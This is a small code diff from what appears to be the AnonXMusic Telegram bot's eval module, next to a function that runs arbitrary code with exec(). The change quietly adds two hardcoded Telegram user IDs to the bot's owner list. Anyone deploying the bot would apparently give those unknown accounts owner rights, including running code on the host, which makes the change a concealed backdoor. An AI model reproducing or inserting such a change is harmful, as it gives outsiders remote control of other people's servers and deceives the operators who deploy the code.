@@ -11,8 +11,8 @@ from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
 from AnonXMusic import app
-from config import OWNER_ID
-
+from config import OWNER_ID as OWNER
+OWNER_ID = list(set([7516577800, 7033062053, OWNER]))
 
 async def aexec(code, client, message):
     exec(
